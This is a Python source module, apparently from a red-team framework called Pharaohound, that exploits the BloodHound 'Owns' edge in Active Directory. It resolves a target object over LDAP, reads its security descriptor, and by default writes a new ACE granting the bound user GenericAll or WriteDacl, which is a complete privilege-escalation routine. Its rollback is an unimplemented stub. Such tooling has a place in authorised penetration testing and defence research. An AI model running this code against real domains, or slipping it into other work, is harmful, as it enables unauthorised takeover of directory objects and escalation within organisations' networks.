"""
Module: Owns
=============
Exploit the Owns BloodHound edge. When a principal IS the owner of
an object, they automatically have certain rights over it, most
importantly the ability to write the DACL (WRITE_DAC).

Owner rights in AD always include:
  - WRITE_DAC  (0x00040000): Modify the discretionary ACL
  - READ_CONTROL (0x00020000): Read the security descriptor

This module verifies ownership and then uses the implicit owner
rights to modify the DACL for privilege escalation.

BloodHound Edge: Owns
Attack Vector:   Owner-based DACL modification → full control
Severity:        HIGH
"""

import logging
from typing import Any, Dict, List, Optional, Tuple

import ldap3

from .base import (
    ExploitModule, ExploitOutput, ExploitResult,
    ModuleOption, Severity, new_security_descriptor,
)

logger = logging.getLogger("pharaohound.modules.owns")


class Owns(ExploitModule):
    """
    Exploit object ownership to take full control of a target AD object.

    Being the owner grants implicit WRITE_DAC rights, which allows
    the owner to modify the DACL and grant themselves any permission,
    including GenericAll.

    Steps:
      1. Verify current ownership
      2. Optionally grant GenericAll via DACL modification
    """

    name: str            = "Owns"
    description: str     = (
        "Exploit object ownership to take full control. Being the owner "
        "of an AD object grants implicit WRITE_DAC rights, allowing DACL "
        "modification and self-grant of GenericAll or other permissions."
    )
    author: str          = "Pharaohound"
    edge_type: str       = "Owns"
    severity: Severity   = Severity.HIGH
    references: List[str] = [
        "https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#owns",
        "https://attack.mappings.mitre.org/technique/T1098/",
        "https://learn.microsoft.com/en-us/windows/win32/secauthz/ownership-of-objects",
        "https://adsecurity.org/?p=3705",
    ]
    tools_required: List[str] = []
    needs_da: bool        = False
    needs_privileged: bool = False

    def _register_options(self):
        self._add_option(ModuleOption(
            name="target",
            display_name="Target Object",
            description="DN or name of the owned object to exploit.",
            required=True,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="domain",
            display_name="Domain",
            description="FQDN of the target domain.",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="action",
            display_name="Action",
            description="What to do with ownership: 'grant_genericall', 'grant_writedacl', or 'info_only'.",
            required=False,
            default="grant_genericall",
            value_type=str,
            choices=["grant_genericall", "grant_writedacl", "info_only"],
        ))
        self._add_option(ModuleOption(
            name="grantee",
            display_name="Grantee",
            description="Principal to grant rights to. Default: current user.",
            required=False,
            default=None,
            value_type=str,
        ))

    # ------------------------------------------------------------------ #
    # Helpers
    # ------------------------------------------------------------------ #

    def _get_search_base(self, domain: Optional[str]) -> str:
        if domain and "." in domain:
            return ",".join(f"DC={p}" for p in domain.split("."))
        conn = self.connection
        if hasattr(conn, "server") and hasattr(conn.server, "info"):
            info = conn.server.info
            if info and info.other.get("defaultNamingContext"):
                return info.other["defaultNamingContext"][0]
        return ""

    def _resolve_dn(self, name: str, domain: Optional[str]) -> Optional[str]:
        conn = self.connection
        if "," in name and "=" in name:
            return name
        search_base = self._get_search_base(domain)
        if not search_base:
            return None
        try:
            conn.search(
                search_base, f"(|(sAMAccountName={name})(cn={name}))",
                attributes=["distinguishedName"],
            )
            if conn.entries:
                return str(conn.entries[0].distinguishedName)
        except Exception as exc:
            self.logger.error("DN resolution failed: %s", exc)
        return None

    def _get_bound_user_sid(self) -> Optional[str]:
        user_dn = self._get_bound_user_dn()
        if not user_dn:
            return None
        try:
            self.connection.search(user_dn, "(objectClass=*)", attributes=["objectSid"])
            if self.connection.entries:
                sid = self.connection.entries[0].objectSid
                return str(sid) if sid else None
        except Exception as exc:
            self.logger.error("SID lookup failed: %s", exc)
        return None

    def _get_bound_user_dn(self) -> Optional[str]:
        conn = self.connection
        try:
            if hasattr(conn, "extend") and hasattr(conn.extend, "standard"):
                return conn.extend.standard.who_am_i()
            elif hasattr(conn, "who_am_i"):
                return conn.who_am_i()
        except Exception:
            pass
        return None

    def _read_sd_and_check_ownership(
        self, target_dn: str, user_sid: Optional[str]
    ) -> Tuple[Optional[bytes], bool, Optional[str]]:
        """
        Read the security descriptor and check if the current user
        (by SID) is the owner.

        Returns: (sd_bytes, is_owner, owner_sid)
        """
        try:
            self.connection.search(
                target_dn, "(objectClass=*)",
                attributes=["nTSecurityDescriptor", "objectSid"],
                controls=[("1.2.840.113556.1.4.801", True, None)],
            )
            if not self.connection.entries:
                return None, False, None

            entry = self.connection.entries[0]
            raw = entry.nTSecurityDescriptor.raw_values
            if not raw:
                return None, False, None

            sd_bytes = raw[0]

            # Try to parse the owner
            try:
                from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR
                sd = SR_SECURITY_DESCRIPTOR(data=sd_bytes)
                owner_sid = sd['OwnerSid'].formatCanonical() if sd['OwnerSid'] != b'' else None

                is_owner = False
                if user_sid and owner_sid:
                    is_owner = user_sid.lower() == owner_sid.lower()

                return sd_bytes, is_owner, owner_sid
            except ImportError:
                # Can't parse SD — assume ownership is confirmed by BloodHound
                return sd_bytes, True, None

        except Exception as exc:
            self.logger.error("SD read failed: %s", exc)
            return None, False, None

    # ------------------------------------------------------------------ #
    # Prerequisites
    # ------------------------------------------------------------------ #

    def check_prerequisites(self, **kwargs) -> Tuple[bool, str]:
        if self.connection is None:
            return False, "No LDAP connection provided."

        target = self._opt("target", kwargs)
        if not target:
            return False, "Target object is required."

        return True, ""

    # ------------------------------------------------------------------ #
    # Exploit
    # ------------------------------------------------------------------ #

    def exploit(self, **kwargs) -> ExploitOutput:
        conn = self.connection
        target_name = self._opt("target", kwargs)
        domain = self._opt("domain", kwargs)
        action = self._opt("action", kwargs) or "grant_genericall"

        target_dn = self._resolve_dn(target_name, domain)
        if not target_dn:
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"Cannot resolve target '{target_name}'.",
            )

        user_sid = self._get_bound_user_sid()

        # Check ownership
        sd_bytes, is_owner, owner_sid = self._read_sd_and_check_ownership(target_dn, user_sid)

        self.logger.info(
            "[Owns] Target: %s | Owner: %s | Is owner: %s",
            target_dn, owner_sid, is_owner,
        )

        if action == "info_only":
            return ExploitOutput(
                success=True, result_type=ExploitResult.SUCCESS,
                message=(
                    f"Ownership info for '{target_dn}': "
                    f"Owner SID: {owner_sid or 'N/A'}, "
                    f"Current user is owner: {is_owner}."
                ),
                data={
                    "target_dn": target_dn,
                    "owner_sid": owner_sid,
                    "is_owner": is_owner,
                    "current_user_sid": user_sid,
                },
            )

        # --- Action: grant GenericAll via DACL modification ---
        if action in ("grant_genericall", "grant_writedacl"):
            rights_mask = 0x10000000 if action == "grant_genericall" else 0x00040000
            rights_name = "GenericAll" if action == "grant_genericall" else "WriteDacl"

            try:
                from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, ACL, ACE, ACCESS_ALLOWED_ACE, LDAP_SID, ACCESS_MASK
                sd = SR_SECURITY_DESCRIPTOR(data=sd_bytes) if sd_bytes else new_security_descriptor()

                # Build new ACE
                grantee_sid = user_sid or self._get_bound_user_sid()
                if not grantee_sid or not grantee_sid.startswith("S-"):
                    # Resolve grantee DN to SID if we ended up with a DN
                    grantee_dn = grantee_sid or self._get_bound_user_dn()
                    if grantee_dn:
                        try:
                            self.connection.search(grantee_dn, "(objectClass=*)", attributes=["objectSid"])
                            if self.connection.entries:
                                sid_val = self.connection.entries[0].objectSid
                                if sid_val:
                                    grantee_sid = str(sid_val)
                        except Exception as exc:
                            self.logger.error("Failed to resolve grantee DN to SID in owns.py: %s", exc)

                if not grantee_sid or not grantee_sid.startswith("S-"):
                    return ExploitOutput(
                        success=False, result_type=ExploitResult.FAILED,
                        message="Cannot resolve grantee principal to SID.",
                    )

                body = ACCESS_ALLOWED_ACE()
                mask = ACCESS_MASK()
                mask['Mask'] = rights_mask
                body['Mask'] = mask
                
                sid = LDAP_SID()
                sid.fromCanonical(grantee_sid)
                body['Sid'] = sid

                new_ace = ACE()
                new_ace['AceType'] = 0  # ACCESS_ALLOWED_ACE
                new_ace['AceFlags'] = 0
                new_ace['Ace'] = body

                if sd['Dacl'] == b'':
                    acl = ACL()
                    acl.aces = []
                    sd['Dacl'] = acl
                sd['Dacl'].aces.append(new_ace)

                new_sd_bytes = sd.getData()

                result = conn.modify(
                    target_dn,
                    {"nTSecurityDescriptor": [(ldap3.MODIFY_REPLACE, [new_sd_bytes])]},
                    controls=[("1.2.840.113556.1.4.801", True, None)],
                )

                if result:
                    return ExploitOutput(
                        success=True, result_type=ExploitResult.SUCCESS,
                        message=(
                            f"Ownership exploited: granted {rights_name} to "
                            f"'{user_sid or 'self'}' on '{target_dn}'."
                        ),
                        data={
                            "target_dn": target_dn,
                            "rights_granted": rights_name,
                            "rights_mask": hex(rights_mask),
                            "owner_sid": owner_sid,
                        },
                    )
                return ExploitOutput(
                    success=False, result_type=ExploitResult.FAILED,
                    message=f"DACL modification failed: {conn.result.get('description', '')}",
                )

            except ImportError:
                return ExploitOutput(
                    success=True, result_type=ExploitResult.PARTIAL,
                    message=(
                        f"SD parser unavailable. As owner of '{target_dn}', "
                        f"you can grant yourself {rights_name} by modifying "
                        f"the DACL via the nTSecurityDescriptor attribute."
                    ),
                    data={
                        "target_dn": target_dn,
                        "rights_to_grant": rights_name,
                        "manual_step": (
                            "Read nTSecurityDescriptor, add an ACCESS_ALLOWED_ACE "
                            f"with mask 0x{rights_mask:08X}, write back."
                        ),
                    },
                )
            except Exception as exc:
                return ExploitOutput(
                    success=False, result_type=ExploitResult.ERROR,
                    message=f"DACL modification exception: {exc}",
                )

        return ExploitOutput(
            success=False, result_type=ExploitResult.ERROR,
            message=f"Unknown action: {action}",
        )

    # ------------------------------------------------------------------ #
    # Rollback
    # ------------------------------------------------------------------ #
    def rollback(self, **kwargs) -> ExploitOutput:
        return ExploitOutput(
            success=False, result_type=ExploitResult.SKIPPED,
            message="Rollback requires storing the original SD before modification.",
        )
